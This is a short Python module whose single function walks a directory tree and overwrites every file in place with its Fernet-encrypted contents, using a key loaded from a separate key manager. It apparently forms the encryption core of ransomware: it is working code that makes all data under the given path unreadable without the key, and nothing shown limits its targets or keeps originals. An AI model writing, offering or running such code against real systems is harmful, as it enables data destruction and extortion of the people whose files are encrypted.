import os
from cryptography.fernet import Fernet
from key_manager import load_key

def encrypt_files(path):
    fernet = Fernet(load_key())

    for root, _, files in os.walk(path):
        for file in files:
            full_path = os.path.join(root, file)
            try:
                with open(full_path, "rb") as f:
                    data = f.read()
                with open(full_path, "wb") as f:
                    f.write(fernet.encrypt(data))
            except Exception as e:
                print(f"[!] Could not encrypt {full_path}: {e}")
